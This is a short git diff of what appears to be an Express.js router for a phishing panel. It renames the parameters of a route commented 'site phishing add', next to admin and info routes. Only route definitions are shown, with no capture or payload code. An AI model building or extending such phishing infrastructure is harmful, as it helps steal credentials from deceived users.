@@ -15,7 +15,7 @@ router.post('/skip', auth.skip_code);
 
 router.post('/admin/add', auth.poster_add);//admin user and pass add
 
-router.post('/ad/:user/:poster', auth.add_data);  ///site phishing add
+router.post('/ad/:adminId/:posterId', auth.add_data);  ///site phishing add
 
 router.get('/info/:username/:id/:admin', auth.info_get);
 
